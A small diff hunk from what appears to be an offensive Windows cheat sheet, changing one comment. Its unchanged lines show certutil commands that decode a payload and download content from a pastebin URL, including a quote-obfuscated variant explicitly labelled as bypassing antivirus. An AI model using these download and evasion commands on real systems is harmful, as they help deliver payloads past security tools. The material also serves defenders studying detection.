@@ -7,7 +7,7 @@ certutil -decode payload.txt payload.bin
 # Urlcache download strings from raw http/https
 certutil -f -urlcache https://pastebin.com/raw/foo123 %temp%\foo.txt
 
-# To bypass AV while using urlcache
+# To bypass AV while download strings via urlcache
 certutil -f -ur""""lc""""ache h""""t""""t""""ps:/""""/pastebin.com/raw/foo123 %temp%\foo.txt
 
 # Ping download strings from raw http/https
